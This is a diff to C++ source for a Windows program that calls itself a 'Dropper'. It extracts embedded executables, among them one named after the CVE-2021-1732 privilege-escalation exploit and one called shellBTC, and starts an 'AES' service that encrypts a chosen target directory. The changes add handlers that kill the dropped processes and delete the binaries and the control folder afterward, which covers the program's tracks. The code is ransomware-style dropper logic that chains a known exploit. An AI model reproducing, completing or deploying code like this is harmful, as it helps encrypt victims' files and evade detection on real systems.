@@ -9,6 +9,47 @@
 
 namespace fs = std::filesystem;
 
+// === Global paths ===
+const std::string controlDir = "C:\\EncControl";
+const std::string aesPath = controlDir + "\\AES.exe";
+const std::string logPath = controlDir + "\\encrypt_service.log";
+const std::string instructionPath = controlDir + "\\instruction.txt";
+const std::string targetDirPath = controlDir + "\\target_dir.txt";
+
+std::string tempDir = fs::temp_directory_path().string();
+std::string consoleAppPath = tempDir + "ConsoleApplication2.exe";
+std::string shellBTCPath = tempDir + "shellBTC.exe";
+std::string cveExePath = tempDir + "CVE-2021-1732.exe";
+
+// === Cleanup logic ===
+void kill_processes() {
+    system("taskkill /IM AES.exe /F >nul 2>&1");
+    system("taskkill /IM ConsoleApplication2.exe /F >nul 2>&1");
+    system("taskkill /IM encserv.exe /F >nul 2>&1");
+}
+
+void safe_delete(const std::string& path) {
+    std::error_code ec;
+    fs::remove(path, ec);
+}
+
+void clean_directory(const std::string& dirPath) {
+    std::error_code ec;
+    for (const auto& entry : fs::directory_iterator(dirPath, ec)) {
+        fs::remove_all(entry.path(), ec);
+    }
+}
+
+// === Handler for Ctrl+C or close ===
+BOOL WINAPI ConsoleHandler(DWORD signal) {
+    if (signal == CTRL_C_EVENT || signal == CTRL_CLOSE_EVENT ||
+        signal == CTRL_LOGOFF_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
+        std::cout << "[CLEANUP] Caught termination. Killing AES-related processes..." << std::endl;
+        kill_processes();
+    }
+    return TRUE;
+}
+
 // === File I/O ===
 void write_to_file(const std::string& path, const std::string& content) {
     std::ofstream file(path, std::ios::trunc);
@@ -86,16 +127,10 @@ bool run_command_via_cve(const std::string& cvePath, const std::string& cmd) {
 }
 
 int main() {
-    std::string controlDir = "C:\\EncControl";
-    std::string aesPath = controlDir + "\\AES.exe";
-    std::string logPath = controlDir + "\\encrypt_service.log";
-    std::string instructionPath = controlDir + "\\instruction.txt";
-    std::string targetDirPath = controlDir + "\\target_dir.txt";
-
-    std::string tempDir = fs::temp_directory_path().string();
-    std::string consoleAppPath = tempDir + "ConsoleApplication2.exe";
-    std::string shellBTCPath = tempDir + "shellBTC.exe";
-    std::string cveExePath = tempDir + "CVE-2021-1732.exe";
+    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
+        std::cerr << "[ERROR] Could not set control handler" << std::endl;
+        return 1;
+    }
 
     std::string userTarget;
 
@@ -128,7 +163,7 @@ int main() {
         if (!extract_resource_to_file(IDR_SHELLBTC_EXE, shellBTCPath)) return 1;
         if (!extract_resource_to_file(IDR_CVE_EXE, cveExePath)) return 1;
 
-        // === Run ConsoleApplication2.exe in background ===
+        // === Run AES background service ===
         std::cout << "[INFO] Starting AES background service..." << std::endl;
         if (!run_exe_background(consoleAppPath)) return 1;
         std::this_thread::sleep_for(std::chrono::seconds(2));
@@ -147,17 +182,35 @@ int main() {
                 std::cerr << "[ERROR] CVE failed to write DECRYPT." << std::endl;
                 return 1;
             }
+
+            // === WAIT for AES to read DECRYPT ===
+            std::cout << "[WAIT] Waiting 8 seconds for AES to read DECRYPT..." << std::endl;
+            std::this_thread::sleep_for(std::chrono::seconds(8));
         } else {
             std::cout << "[INFO] No decryption triggered." << std::endl;
         }
 
-        // Optional cleanup
-        system("taskkill /IM AES.exe /F >nul 2>&1");
+        // === Final cleanup ===
+        std::cout << "[INFO] Killing AES and related processes..." << std::endl;
+        kill_processes();
 
-        std::cout << "[INFO] Dropper complete." << std::endl;
+        std::cout << "[WAIT] Waiting 5 seconds for shutdown..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+
+        std::cout << "[INFO] Cleaning up files..." << std::endl;
+        safe_delete(consoleAppPath);
+        safe_delete(shellBTCPath);
+        safe_delete(cveExePath);
+
+        clean_directory(controlDir);
+        std::error_code ec;
+        fs::remove(controlDir, ec);
+
+        std::cout << "[INFO] Dropper complete. Cleanup done." << std::endl;
 
     } catch (const std::exception& e) {
         std::cerr << "[FATAL] " << e.what() << std::endl;
+        kill_processes();
         return 1;
     }
 
